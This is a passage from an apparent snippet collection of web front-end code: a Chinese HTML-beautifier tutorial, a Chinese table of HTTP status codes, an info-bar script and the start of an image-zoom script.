                    token_value_array.push(val);
                    pos++;
                } while (val !== ">");

                token_value = $.trim(token_value_array.join(""));
                // 当前标签的名称（小写）
                tagName = getTagName();

                if (token_value[1] === "/") {
                    // token_value以"</"开始，则认为是结束标签
                    token_type = "END_TAG";
                } else if (contains(tagName, single_token) || token_value[token_value.length - 2] === "/") {
                    // 如果标签在single_token或者token_value以"/>"结尾，则认为是独立标签
                    // 这种判断没有考虑这种情况："<br></br>"
                    token_type = "SINGLE_TAG";
                } else {
                    token_type = "START_TAG";
                }
            }

            function getTagName() {
                var tagName = token_value.substr(1, token_value.length - 2);
                var spaceIndex = tagName.indexOf(" ");
                if (spaceIndex > 0) {
                    tagName = tagName.substr(0, spaceIndex);
                }
                return tagName.toLowerCase();
            }

            function contains(val, array) {
                for (var i = 0; i < array.length; i++) {
                    if (val === array[i]) {
                        return true;
                    }
                }
                return false;
            }


            // parse的主体函数，循环获取下一个Token
            while (true) {
                nextToken();

                // 当前Token为结束标记
                if (token_type === "END") {
                    break;
                }

                switch (token_type) {
                    case "START_TAG":
                        // 我们对缩进的控制非常简单，开始标签后缩进一个单位
                        outputToken();
                        indent_level++;
                        break;
                    case "END_TAG":
                        // 结束标签前减少一个单位缩进
                        indent_level--;
                        outputToken();
                        break;
                    case "SINGLE_TAG":
                    case "CONTENT":
                        outputToken();
                        break;
                }
            }
            // 去除最前面的"\n"
            this.result = output.join("").substr(1);
        };



        $(function() {
            $("#format").click(function() {

                // 实例化HtmlBeautify，传递需要解析的HTML片段和缩进字符串
                var beautify = new HtmlBeautify($("#content").val(), "    ");
                $("#content").val(beautify.result);

            });
        });
      
    </script>

</head>
<body>
    <h1>
        自己实现HTML-Beautify</h1>
    <textarea style="width: 600px; height: 300px;" id="content">
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" ><head><title>Untitled Page</title></head><body><h1>Page Header</h1><ul><li>list item 1</li><li>list item 2</li><li>list item 3</li><li>list item 4</li></ul></body></html>
    </textarea>
    <br />
    <input type="button" id="format" value="Format" />
    <br />
    <br />
    学习HTML-Beautify.js之后，我们发现使用JavaScript对HTML进行解析也并不神秘， 首先是逐字符进行分析，从中提取标记（Token），在HTML只存在两种类型的标记-标签和正文，
    然后对这些Token进行语法分析，主要是缩进量是多少。
    <br />
    在有这些基本概念后，今天我们就自己来实现这个小程序：
    <pre>
    // 我在Html Beautifier的一个简单尝试
    function HtmlBeautify(source, indent_value) {
        this.source = source;
        this.indent_value = indent_value;
        this.result = "";

        this.parse();
    }

    // 分析并产生输出到this.result
    HtmlBeautify.prototype.parse = function() {
        var that = this;
        // 当前分析到哪个字符，当前标记值，标记类型，输出数组，缩进级别
        var pos = 0, token_value = "", token_type = "",
        output = [], indent_level = 0;

        // 把这些标签作为Single Tag
        var single_token = "br,input,link,meta,!doctype,basefont,base,area,hr,wbr,param,img,isindex,?xml,embed".split(',');

        // 输出当前标记（换行+缩进量+标记值）
        function outputToken() {
            output.push("\n");
            for (var i = 0; i &lt; indent_level; i++) {
                output.push(that.indent_value);
            }
            output.push(token_value);
        }

        // 获取下一个标记（首先获取正文，如果正文为空则获取标签）
        function nextToken() {
            var token_value_array = [], val = "";

            // "&lt;"之前的所有内容作为正文标签
            while ((val = that.source[pos]) !== "&lt;") {
                if (pos &gt;= that.source.length) {
                    token_type = "END";
                    return;
                }

                token_value_array.push(val);
                pos++;
            }

            token_value = $.trim(token_value_array.join(""));
            if (token_value === "") {
                // 如果正文标记为空，则获取标签标记
                nextTokenTag();
            } else {
                token_type = "CONTENT";
            }
        }

        function nextTokenTag() {
            var token_value_array = [], val = "", tagName = "";

            // 获取标签标记，直到遇到"&gt;"
            do {
                val = that.source[pos];
                token_value_array.push(val);
                pos++;
            } while (val !== "&gt;");

            token_value = $.trim(token_value_array.join(""));
            // 当前标签的名称（小写）
            tagName = getTagName();

            if (token_value[1] === "/") {
                // token_value以"&lt;/"开始，则认为是结束标签
                token_type = "END_TAG";
            } else if (contains(tagName, single_token) || token_value[token_value.length - 2] === "/") {
                // 如果标签在single_token或者token_value以"/&gt;"结尾，则认为是独立标签
                // 这种判断没有考虑这种情况："&lt;br&gt;&lt;/br&gt;"
                token_type = "SINGLE_TAG";
            } else {
                token_type = "START_TAG";
            }
        }

        function getTagName() {
            var tagName = token_value.substr(1, token_value.length - 2);
            var spaceIndex = tagName.indexOf(" ");
            if (spaceIndex &gt; 0) {
                tagName = tagName.substr(0, spaceIndex);
            }
            return tagName.toLowerCase();
        }

        function contains(val, array) {
            for (var i = 0; i &lt; array.length; i++) {
                if (val === array[i]) {
                    return true;
                }
            }
            return false;
        }


        // parse的主体函数，循环获取下一个Token
        while (true) {
            nextToken();
            
            // 当前Token为结束标记
            if (token_type === "END") {
                break;
            }

            switch (token_type) {
                case "START_TAG":
                    // 我们对缩进的控制非常简单，开始标签后缩进一个单位
                    outputToken();
                    indent_level++;
                    break;
                case "END_TAG":
                    // 结束标签前减少一个单位缩进
                    indent_level--;
                    outputToken();
                    break;
                case "SINGLE_TAG":
                case "CONTENT":
                    outputToken();
                    break;
            }
        }
        // 去除最前面的"\n"
        this.result = output.join("").substr(1);
    };



    $(function() {
        $("#format").click(function() {

            // 实例化HtmlBeautify，传递需要解析的HTML片段和缩进字符串
            var beautify = new HtmlBeautify($("#content").val(), "    ");
            $("#content").val(beautify.result);

        });
    });
    </pre>
</body>
</html>

#T=http 状态码
状态码	含义
100	客户端应当继续发送请求。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。
101	服务器已经理解了客户端的请求，并将通过Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade 消息头中定义的那些协议。 　　只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。
102	由WebDAV（RFC 2518）扩展的状态码，代表处理将被继续执行。
200	请求已成功，请求所希望的响应头或数据体将随此响应返回。
201	请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回。假如需要的资源无法及时建立的话，应当返回 '202 Accepted'。
202	服务器已接受请求，但尚未处理。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。 　　返回202状态码的响应的目的是允许服务器接受其他过程的请求（例如某个每天只执行一次的基于批处理的操作），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回202状态码的响应应当在返回的实体中包含一些指示处理当前状态的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。
203	服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超级。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。
204	服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。 　　如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。 　　由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。
205	服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。 　　与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。
206	服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。 　　该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。 　　响应必须包含如下的头部域： 　　Content-Range 用以指示本次响应中返回的内容的范围；如果是 Content-Type 为 multipart/byteranges 的多段下载，则每一 multipart 段中都应包含 Content-Range 域用以指示本段的内容范围。假如响应中包含 Content-Length，那么它的数值必须匹配它返回的内容范围的真实字节数。 　　Date 　　ETag 和/或 Content-Location，假如同样的请求本应该返回200响应。 　　Expires, Cache-Control，和/或 Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 　　假如本响应请求使用了 If-Range 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 If-Range 弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回200响应中应当返回的所有实体头部域。 　　假如 ETag 或 Last-Modified 头部不能精确匹配的话，则客户端缓存应禁止将206响应返回的内容与之前任何缓存过的内容组合在一起。 　　任何不支持 Range 以及 Content-Range 头的缓存都禁止缓存206响应返回的内容。
207	由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。
300	被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。 　　除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 　　如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。
301	被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。 　　新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 　　注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个301响应的话，接下来的重定向请求将会变成 GET 方式。
302	请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 　　新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 　　注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。
303	对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 　　新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。 　　注意：许多 HTTP/1.1 版以前的 浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。
304	如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。 　　该响应必须包含以下的头信息： 　　Date，除非这个服务器没有时钟。假如没有时钟的服务器也遵守这些规则，那么代理服务器以及客户端可以自行将 Date 字段添加到接收到的响应头中去（正如RFC 2068中规定的一样），缓存机制将会正常工作。 　　ETag 和/或 Content-Location，假如同样的请求本应返回200响应。 　　Expires, Cache-Control，和/或Vary，假如其值可能与之前相同变量的其他响应对应的值不同的话。 　　假如本响应请求使用了强缓存验证，那么本次响应不应该包含其他实体头；否则（例如，某个带条件的 GET 请求使用了弱缓存验证），本次响应禁止包含其他实体头；这避免了缓存了的实体内容和更新了的实体头信息之间的不一致。 　　假如某个304响应指明了当前某个实体没有缓存，那么缓存系统必须忽视这个响应，并且重复发送不包含限制条件的请求。 　　假如接收到一个要求更新某个缓存条目的304响应，那么缓存系统必须更新整个条目以反映所有在响应中被更新的字段的值。
305	被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。 　　注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。
306	在最新版的规范中，306状态码已经不再被使用。
307	请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 　　新的临时性的URI 应当在响应的 Location 域中返回。除非这是一个HEAD 请求，否则响应的实体中应当包含指向新的URI 的超链接及简短说明。因为部分浏览器不能识别307响应，因此需要添加上述必要信息以便用户能够理解并向新的 URI 发出访问请求。 　　如果这不是一个GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。
400	1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。 　　2、请求参数有误。
401	当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。参见RFC 2617。
402	该状态码是为了将来可能的需求而预留的。
403	服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。
404	请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。
405	请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 　　鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。
406	请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。 　　除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。
407	　与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。参见RFC 2617。
408	请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。
409	由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。 　　冲突通常发生于对 PUT 请求的处理中。例如，在采用版本检查的环境下，某次 PUT 提交的对特定资源的修改请求所附带的版本信息与之前的某个（第三方）请求向冲突，那么此时服务器就应该返回一个409错误，告知用户请求无法完成。此时，响应实体中很可能会包含两个冲突版本之间的差异比较，以便用户重新提交归并以后的新版本。
410	被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用404状态码。除非额外说明，否则这个响应是可缓存的。 　　410响应的目的主要是帮助网站管理员维护网站，通知用户该资源已经不再可用，并且服务器拥有者希望所有指向这个资源的远端连接也被删除。这类事件在限时、增值服务中很普遍。同样，410响应也被用于通知客户端在当前服务器站点上，原本属于某个个人的资源已经不再可用。当然，是否需要把所有永久不可用的资源标记为'410 Gone'，以及是否需要保持此标记多长时间，完全取决于服务器拥有者。
411	服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。
412	服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。
413	服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 　　如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。
414	请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括： 　　本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。 　　重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。 　　客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。
415	对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。
416	如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。 　　假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。
417	在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。
421	从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。
422	从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。
422	请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）423 Locked 　　当前资源被锁定。（RFC 4918 WebDAV）
424	由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）
425	在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。
426	客户端应当切换到TLS/1.0。（RFC 2817）
449	由微软扩展，代表请求应当在执行完适当的操作后进行重试。
500	服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。
501	服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。
502	作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。
503	由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。 　　注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。
504	作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。 　　注意：某些代理服务器在DNS查询超时时会返回400或者500错误
505	服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。
506	由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。
507	服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)
509	服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。
510	获取资源所需要的策略并没有没满足。（RFC 2774）
#T=IE 提示条
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
<script type="text/javascript" language="javascript">
//Copyright (c) 2008 Lewis Linn White Jr.
//Author: Lewis Linn White Jr.

//Permission is hereby granted, free of charge, to any person
//obtaining a copy of this software and associated documentation
//files (the "Software"), to deal in the Software without
//restriction, including without limitation the rights to use,
//copy, modify, merge, publish, distribute, sublicense, and/or sell
//copies of the Software, and to permit persons to whom the
//Software is furnished to do so, subject to the following
//conditions:

//The above copyright notice and this permission notice shall be
//included in all copies or substantial portions of the Software.
//Except as contained in this notice, the name(s) of the above 
//copyright holders shall not be used in advertising or otherwise 
//to promote the sale, use or other dealings in this Software without 
//prior written authorization.

//THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
//EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
//OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
//NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
//HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
//WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
//FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
//OTHER DEALINGS IN THE SOFTWARE.

//Icons used in this project are graciously provided by the Silk icons set:
//http://www.famfamfam.com/lab/icons/silk/

function infoBar(settings)
{
	//test to see if we can support this
	if(!document.createElement)
	{
		alert('I\'m sorry, but your browser doesn\'t support this feature.');
		return;
	}
	//create an empty settings object if one isn't provided
	if(!settings)
	{
		var settings = {};
	}
	
	//ie6 doesn't support the 'fixed' css position, so will will have to hack around it
	var ie6 = (document.all && window.external && (typeof document.documentElement.style.maxHeight == 'undefined')) ? true : false;	
	
	//Create and setup the info bar
	var infoBar = document.createElement('div');
	this.currentOpacity = 10;
	this.infoBar = infoBar;
	infoBar.style.backgroundColor = settings.backColor || '#fff68f';
	infoBar.style.opacity = '1';
	infoBar.style.filter = 'alpha(opacity=100)';
	infoBar.style.fontSize = '8pt';
	infoBar.style.top = '0px';
	infoBar.style.left = '0px';
	infoBar.style.lineHeight = '12px';
	infoBar.style.padding = '0px';
	infoBar.style.width = '100%';
	infoBar.style.fontFamily = 'Verdana';
	infoBar.style.fontColor = settings.fontColor || '#000000';
	//ie6 doesn't support the 'fixed' css position, so will will have to hack around it
	infoBar.style.position = (ie6) ? 'absolute' : 'fixed';
	infoBar.style.display = 'none';
	infoBar.style.border = '1px solid #000000';
	infoBar.style.borderTop = '0px';
	infoBar.style.borderLeft = '0px';
	infoBar.style.borderRight = '0px';
	infoBar.style.zIndex = 1000;
	//ie6 doesn't support the 'fixed' css position, so will will have to hack around it
	if(ie6)
	{
		window.onscroll = function()
		{
			infoBar.style.top = parseInt(window.pageYOffset || (document.documentElement.scrollTop || 0)) + 'px';
			infoBar.style.left = parseInt(window.pageXOffset || (document.documentElement.scrollLeft || 0)) + 'px';
		}
	}
	
	//Create our icon
	var icon = document.createElement('img');
	this.infoBar.icon = icon;
	icon.src = (settings.icon || 'information') + '.png'; 
	icon.style.cssFloat = 'left';
	icon.style.styleFloat = 'left';  //for IE
	icon.style.verticalAlign = 'middle';
	icon.style.paddingTop = '3px';
	icon.style.paddingLeft = '3px';
	icon.style.paddingRight = '3px';
	icon.style.paddingBottom = '3px';
	
	//Create our close button 
	var close = document.createElement('img');
	close.src = 'cross.png';
	close.style.cssFloat = 'right';
	close.style.styleFloat = 'right'; //for IE
	close.style.verticalAlign = 'middle';
	close.style.paddingTop = '3px';
	close.style.paddingBottom = '3px';
	close.style.cursor = 'pointer';
	close.onclick = function()
	{
		infoBar.style.display = 'none';
	};
	
	//Create our text entry
	var text = document.createElement('div');
	this.infoBar.infoText = text;
	text.innerHTML = settings.text || '';
	text.style.paddingTop = '3px';
	text.style.paddingBottom = '3px';
	
	infoBar.appendChild(close);
	infoBar.appendChild(icon);
	infoBar.appendChild(text);
	document.body.insertBefore(infoBar, document.body.firstChild);
}

infoBar.prototype.show = function(fade)
{
	var that = this;
	if(typeof fade == "number")
	{
		this.currentOpacity = 0;
		this.infoBar.style.opacity = '0';
		this.infoBar.style.filter = 'alpha(opacity=0)';
		this.intervalID = window.setInterval(function()
											{
													if(that.currentOpacity < 11)
													{
														that.infoBar.style.opacity = that.currentOpacity / 10;
														that.infoBar.style.filter = 'alpha(opacity=' + that.currentOpacity * 10 + ')';
														that.currentOpacity++;
													}
													else
													{
														window.clearInterval(that.intervalID);
													}
											}, fade);
	}
	else
	{
		this.infoBar.style.opacity = '1';
		this.infoBar.style.filter = 'alpha(opacity=100)';
	}
	this.infoBar.style.display = 'block';
};

infoBar.prototype.setText = function(newText)
{
	this.infoBar.infoText.innerHTML = newText;
};

infoBar.prototype.setIcon = function(newIcon)
{
	this.infoBar.icon.src = newIcon + '.png';
};

infoBar.prototype.setFontColor = function(fontColor)
{
	this.infoBar.text.style.color = fontColor;
};

infoBar.prototype.setBackColor = function(backColor)
{
	this.infoBar.style.backgroundColor = backColor;
};

infoBar.prototype.hide = function()
{
	this.infoBar.style.display = 'none';
};

infoBar.prototype.destroy = function()
{
	document.body.removeChild(this.infoBar);
};
window.onload = function()
{
	var bar = new infoBar({text: 'This is a test'});
	bar.show(50);
};
</script>


 </head>

 <body>
  
 </body>
</html>

#T=Image Zoom 图片缩放
/*
 *Author:sohighthesky
 *From:http://www.cnblogs.com/sohighthesky/
 *Date:2009-11-14
 */
/*
 *img 指定要放大的图片或者其id
 *options:参见代码中setOptions中的注释
 */
var imageZoom = function(img,options) {
	this.img=this.g(img);
	if(this.img.nodeName!="IMG") {
		if(this.img && this.img.children[0].nodeName=="IMG")this.img=this.img.children[0];
		else throw Error("Invalid argument [img]!");
	}
	this.setOptions(options);
	this.init();
}
imageZoom.prototype={
	g:function(id) {return typeof(id)=="string"?document.getElementById(id):id;},
	ae:function(el,type,call) {
		if(el.addEventListener)el.addEventListener(type,call,false);
		else el.attachEvent("on"+type,call);
	},
	getPos:function(o){//取元素坐标
		var x = 0, y = 0;
		do{x += o.offsetLeft; y += o.offsetTop;}
		while(o=o.offsetParent);
		return {'x':x,'y':y};
	},
	setOptions:function(options) {
		this.options={
			mul:0,//默认为不放大（显示图片的原来大小）
			bigImg:null,//指定放大的图片路径（要跟小图成比例才好）
			viewer:null, //指定显示的位置(可以为一个div或者其id)
			viewerMul:1//指定显示div的放大倍数，默认为原大小,设置viewer时此参数无效
		};
		for(var o in options) {this.options[o]=options[o];}
		this.options.bigImg =this.options.bigImg ||this.img.src;
	},
	getSize:function(o) {
		return {w:o.offsetWidth,h:o.offsetHeight};
	},
	createView:function() {		
		var _is=this.getSize(this.img);
		var d=document;
		if(this.options.viewer){
			this.viewer=this.g(this.options.viewer);
			this.viewer.style.overflow="hidden";
			this.viewer.style.position="relative";
		} else {
			this.viewer=d.createElement("div");
			var pos=this.getPos(this.img);
			this.viewer.style.cssText="display:none;overflow:hidden;position:absolute;top:"+pos.y+"px;left:"+(pos.x+_is.w+10)+"px;height:"+_is.h*this.options.viewerMul+"px;width:"+_is.w*this.options.viewerMul+"px";
			d.body.appendChild(this.viewer);
		}		
		this.viewimg=d.createElement("img");
		this.viewimg.style.cssText="position:relative;left:-33%;top:-33%;";
		this.viewimg.src=this.options.bigImg;
		if(this.options.mul) {//设置放大倍数
			this.viewimg.style.width=_is.w*this.options.mul +"px";
			this.viewimg.style.height=_is.h*this.options.mul +"px";
		}
		this.viewer.appendChild(this.viewimg);
	},
	move:function(e) {
		if(!this.options.mul)
			this.options.mul=this.viewimg.offsetHeight/this.img.offsetHeight;
		var pos=this.getPos(this.img);
